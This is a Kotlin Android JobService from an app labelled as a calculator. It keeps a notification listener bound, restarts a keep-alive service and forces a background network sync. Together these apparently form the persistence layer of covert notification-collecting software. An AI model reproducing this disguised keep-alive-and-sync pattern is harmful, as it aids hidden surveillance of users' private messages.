package com.android.mycalculator
import android.app.job.JobParameters
import android.app.job.JobService
import android.content.ComponentName
import android.content.Intent
import android.os.Build
import android.service.notification.NotificationListenerService
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class BackupJobService : JobService() {
    
    override fun onStartJob(params: JobParameters?): Boolean {
        // This runs when system wakes up device for maintenance
        
        // 1. Check if services are running
        val enabledListeners = android.provider.Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        )
        
        val isListenerRunning = enabledListeners != null && enabledListeners.contains(packageName)
        
        if (!isListenerRunning) {
            // Rebind notification listener
            val componentName = ComponentName(this, NotificationService::class.java)
            NotificationListenerService.requestRebind(componentName)
        }
        
        // 2. Start all services to be safe
        startService(Intent(this, NotificationService::class.java))
        startService(Intent(this, KeepAliveService::class.java))
        
        // 3. Force a sync
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()

        val syncWork = OneTimeWorkRequestBuilder<SyncWorker>()
            .setConstraints(constraints)
            .setInitialDelay(5, TimeUnit.SECONDS)
            .setBackoffCriteria(
                androidx.work.BackoffPolicy.LINEAR,
                5,
                TimeUnit.MINUTES
            )
            .build()
            
        WorkManager.getInstance(this).enqueueUniqueWork(
            "JobSyncWork",
            androidx.work.ExistingWorkPolicy.REPLACE,
            syncWork
        )
        
        // Tell system we're done
        jobFinished(params, false)
        return true
    }
    
    override fun onStopJob(params: JobParameters?): Boolean {
        // Called if job is cancelled before finishing
        return true // Reschedule
    }
}
